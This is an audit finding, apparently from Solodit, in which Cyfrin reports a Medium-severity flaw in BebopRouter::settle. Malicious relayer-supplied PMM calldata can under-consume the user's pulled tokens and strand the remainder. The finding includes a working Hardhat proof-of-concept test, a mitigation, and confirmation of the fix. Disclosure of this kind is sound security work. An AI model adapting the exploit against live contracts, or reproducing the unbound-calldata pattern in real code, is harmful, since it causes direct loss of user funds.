---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-12-cyfrin-bebop-router-v2-0-1-1
ingested_at: '2026-08-09T05:32:30Z'
protocol_category: []
published_at: '2026-06-12T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-12-cyfrin-bebop-router-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-12-cyfrin-bebop-router-v2-0
title: '`BebopRouter::settle` can strand user input by allowing relayer-supplied PMM
  calldata to consume less than the router pulled'
vuln_class: []
---

# `BebopRouter::settle` can strand user input by allowing relayer-supplied PMM calldata to consume less than the router pulled

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-12-cyfrin-bebop-router-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-12-cyfrin-bebop-router-v2.0.md)_

---

**Description:** In `settle`, the router pulls `newFromAmount` of `fromToken` from the user, bounded by the signed `maxFromAmount`, approves the PMM, and writes `filledTakerAmount = newFromAmount` into the relayer-supplied PMM calldata. However, the PMM calldata is not bound to the signed router order. A malicious relayer can therefore supply maker-signed PMM calldata whose `taker_amount` is smaller than `newFromAmount`.

`BebopSettlement` clamps the actual pull from the router to the PMM order's `taker_amount`:

```solidity
// BebopSettlement::_executeSingleOrder
_transferToken(
    order.taker_address,
    order.maker_address,
    order.taker_token,
    filledTakerAmount == 0 || filledTakerAmount > order.taker_amount
        ? order.taker_amount
        : filledTakerAmount,
    ...
);
```

As a result, the router may pull the full `newFromAmount` from the user while the PMM consumes only `taker_amount`. `_executePmmSwap` does not refund the unconsumed input:

```solidity
// BebopPmmHelper::_executePmmSwap
_ensureApproval(IERC20(fromToken), bebopPmm, newFromAmount);
(bool success, bytes memory returnData) = bebopPmm.call(pmmCalldata);
```

The difference `newFromAmount - taker_amount` remains stranded in the router.

**Files:**
- `contracts/base/BebopPmmHelper.sol` - `BebopPmmHelper::_executePmmSwap`
- `contracts/BebopRouter.sol` - `BebopRouter::settle`

**Impact:** A `settle` user can lose the difference between the amount pulled from them and the smaller amount consumed by the PMM fill. This is not only a front-end sizing mistake: because `bebopPmmCalldata` is relayer-supplied and not committed by the user signature, a malicious relayer can intentionally choose PMM calldata that under-consumes the user's input.

The loss is bounded by the user's signed `maxFromAmount` for the order, but it is direct user fund loss/stranding. The stranded balance is not automatically returned to the original payer and may later be swept through balance-of-router flows authorized for a different receiver.

**Proof Of Concept:**

Add this to `test/audit/poc.test.ts` folder and run

`npx hardhat test test/audit/poc.test.ts --config hardhat.config.ts`

```typescript
import { expect } from "chai";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomicfoundation/hardhat-ethers/signers";
import { WETH, USDC, e6, e18 } from "../test-configs";

const BEBOP_PMM = "0xbbbbbBB520d69a9775E85b458C58c648259FAD5F";
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const PMM_DOMAIN_NAME = "BebopSettlement";
const PMM_DOMAIN_VERSION = "2";
const ROUTER_DOMAIN_NAME = "BebopRouter";
const ROUTER_DOMAIN_VERSION = "1";
const USDC_SLOT = 9n;

interface PmmSingleOrder {
  expiry: bigint; taker_address: string; maker_address: string; maker_nonce: bigint;
  taker_token: string; maker_token: string; taker_amount: bigint; maker_amount: bigint;
  receiver: string; packed_commands: bigint; flags: bigint;
}
interface RouterOrder {
  fromAmount: bigint; toAmount: bigint; limitAmount: bigint;
  fromToken: string; toToken: string; pmmFromToken: string; pmmToToken: string;
  tokensOwner: string; receiver: string; originAddress: string;
  oracle: string; checker: string; info: bigint; routerNonce: bigint; unsignedFlags: bigint;
}

function packInfo(expiry: bigint): bigint { return (expiry << 64n); }

async function signRouterOrder(signer: SignerWithAddress, verifyingContract: string, chainId: bigint, order: RouterOrder, extraInfo: string, hooksHash: string) {
  return signer.signTypedData(
    { name: ROUTER_DOMAIN_NAME, version: ROUTER_DOMAIN_VERSION, chainId, verifyingContract },
    { BebopRouterOrder: [
      { name: "fromAmount", type: "uint256" }, { name: "toAmount", type: "uint256" },
      { name: "limitAmount", type: "int256" }, { name: "fromToken", type: "address" },
      { name: "toToken", type: "address" }, { name: "pmmFromToken", type: "address" },
      { name: "pmmToToken", type: "address" }, { name: "tokensOwner", type: "address" },
      { name: "receiver", type: "address" }, { name: "originAddress", type: "address" },
      { name: "oracle", type: "address" }, { name: "checker", type: "address" },
      { name: "info", type: "uint256" }, { name: "routerNonce", type: "uint256" },
      { name: "extraInfoHash", type: "bytes32" }, { name: "hooksHash", type: "bytes32" },
    ]},
    { ...order, extraInfoHash: ethers.keccak256(extraInfo), hooksHash }
  );
}
async function signPmmSingleOrder(signer: SignerWithAddress, pmmAddress: string, chainId: bigint, order: PmmSingleOrder, partnerId: bigint) {
  return signer.signTypedData(
    { name: PMM_DOMAIN_NAME, version: PMM_DOMAIN_VERSION, chainId, verifyingContract: pmmAddress },
    { SingleOrder: [
      { name: "partner_id", type: "uint64" }, { name: "expiry", type: "uint256" },
      { name: "taker_address", type: "address" }, { name: "maker_address", type: "address" },
      { name: "maker_nonce", type: "uint256" }, { name: "taker_token", type: "address" },
      { name: "maker_token", type: "address" }, { name: "taker_amount", type: "uint256" },
      { name: "maker_amount", type: "uint256" }, { name: "receiver", type: "address" },
      { name: "packed_commands", type: "uint256" },
    ]},
    { partner_id: partnerId, ...order }
  );
}
function encodePmmSwapSingle(order: PmmSingleOrder, makerSig: string, filledTakerAmount: bigint) {
  const iface = new ethers.Interface([
    "function swapSingle(tuple(uint256,address,address,uint256,address,address,uint256,uint256,address,uint256,uint256) order, tuple(bytes,uint256) makerSignature, uint256 filledTakerAmount)"
  ]);
  return iface.encodeFunctionData("swapSingle", [
    [order.expiry, order.taker_address, order.maker_address, order.maker_nonce, order.taker_token, order.maker_token, order.taker_amount, order.maker_amount, order.receiver, order.packed_commands, order.flags],
    [makerSig, 0n], filledTakerAmount
  ]);
}
async function fundUsdc(to: string, amount: bigint) {
  const slot = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["address", "uint256"], [to, USDC_SLOT]));
  await ethers.provider.send("hardhat_setStorageAt", [USDC, slot, ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [amount])]);
}
async function fundWeth(signer: SignerWithAddress, amount: bigint) {
  await signer.sendTransaction({ to: WETH, value: amount, data: "0xd0e30db0" }); // deposit()
}

describe("Audit PoCs", function () {
  this.timeout(300000);
  let router: any, chainId: bigint, routerAddr: string;
  let owner: SignerWithAddress, routerSigner: SignerWithAddress, user: SignerWithAddress;
  let treasury: SignerWithAddress, maker: SignerWithAddress, attacker: SignerWithAddress;
  let usdc: any, weth: any;
  let nonce = 1000n;

  before(async () => {
    const s = await ethers.getSigners();
    [owner, routerSigner, user, treasury, , maker, , , , , attacker] = s;
    maker = s[5]; attacker = s[10];
    chainId = (await ethers.provider.getNetwork()).chainId;
    router = await (await ethers.getContractFactory("BebopRouter")).deploy(treasury.address, routerSigner.address, BEBOP_PMM, PERMIT2, WETH);
    await router.waitForDeployment();
    routerAddr = await router.getAddress();
    usdc = await ethers.getContractAt("IERC20", USDC);
    weth = await ethers.getContractAt("IERC20", WETH);
  });


  it("pmm taker_amount < fill strands user input in the router", async () => {
    const expiry = BigInt(Math.floor(Date.now() / 1000) + 3600);
    const routerNonce = nonce++, makerNonce = nonce++;
    const order: RouterOrder = {
      fromAmount: e6(1000), toAmount: e18("0.5"), limitAmount: 0n,
      fromToken: USDC, toToken: WETH, pmmFromToken: USDC, pmmToToken: WETH,
      tokensOwner: user.address, receiver: user.address,
      originAddress: ethers.ZeroAddress, oracle: ethers.ZeroAddress, checker: ethers.ZeroAddress,
      info: packInfo(expiry), routerNonce, unsignedFlags: 0n,
    };
    await fundUsdc(user.address, e6(1000));
    await usdc.connect(user).approve(routerAddr, e6(1000));
    await fundWeth(maker, e18("0.3"));
    await weth.connect(maker).approve(BEBOP_PMM, ethers.MaxUint256);
    // PMM order only covers 600 USDC; router still pulls the full 1000 from the user
    const pmm: PmmSingleOrder = {
      expiry, taker_address: routerAddr, maker_address: maker.address, maker_nonce: makerNonce,
      taker_token: USDC, maker_token: WETH, taker_amount: e6(600), maker_amount: e18("0.3"),
      receiver: routerAddr, packed_commands: 0n, flags: 0n,
    };
    const makerSig = await signPmmSingleOrder(maker, BEBOP_PMM, chainId, pmm, 0n);
    const pmmCalldata = encodePmmSwapSingle(pmm, makerSig, 0n);
    const routerSig = await signRouterOrder(routerSigner, routerAddr, chainId, order, "0x", ethers.ZeroHash);
    const userSig = await signRouterOrder(user, routerAddr, chainId, order, "0x", ethers.ZeroHash);

    const routerUsdc0 = await usdc.balanceOf(routerAddr);
    await router.connect(owner).settle(e6(1000), order, "0x", routerSig, pmmCalldata, [], userSig);
    const routerUsdcStranded = (await usdc.balanceOf(routerAddr)) - routerUsdc0;

    // user paid 1000 USDC; PMM consumed only 600; 400 stranded in the router (unrefunded)
    expect(routerUsdcStranded).to.equal(e6(400));
  });


});

```

**Recommended Mitigation:** Consider require the PMM order to consume exactly what the router pulled, or refund the remainder after the PMM call. For example, snapshot the router's `pmmFromToken` balance before settlement and require the balance delta to equal `newFromAmount`, or transfer any unconsumed remainder back to the original payer. Alternatively, decode and validate the PMM `taker_amount` before settlement so it cannot be smaller than `newFromAmount`, or bind the PMM calldata/amounts into the signed router order..

**Bebop:** Fixed in commit [9db95bc](https://github.com/bebop-dex/bebop-rfqa/commit/9db95bc2b423d9317c149e90a70ae51565e26367).

**Cyfrin:**
Verified. Unused exact-in input is swept to treasury while enforcing the signed output floor.


\clearpage
